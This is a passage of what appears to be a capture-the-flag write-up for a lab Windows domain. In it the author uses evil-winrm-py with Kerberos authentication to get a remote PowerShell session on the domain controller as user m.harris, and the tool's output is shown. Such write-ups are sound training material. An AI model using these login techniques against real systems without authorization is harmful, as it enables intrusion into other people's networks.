@@ -439,4 +439,20 @@ he is a member of remote management users
 
 But also protected users so ill have to use kerberos
 
+# Access to WINRM as `m.harris`
+
+```python
+evil-winrm-py -i dc01.infiltrator.htb -u m.harris -k --no-pass
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc01.infiltrator.htb:5985' as 'm.harris'
+evil-winrm-py PS C:\Users\M.harris\Documents>
+```
+
+I now have access as this user!
+
 
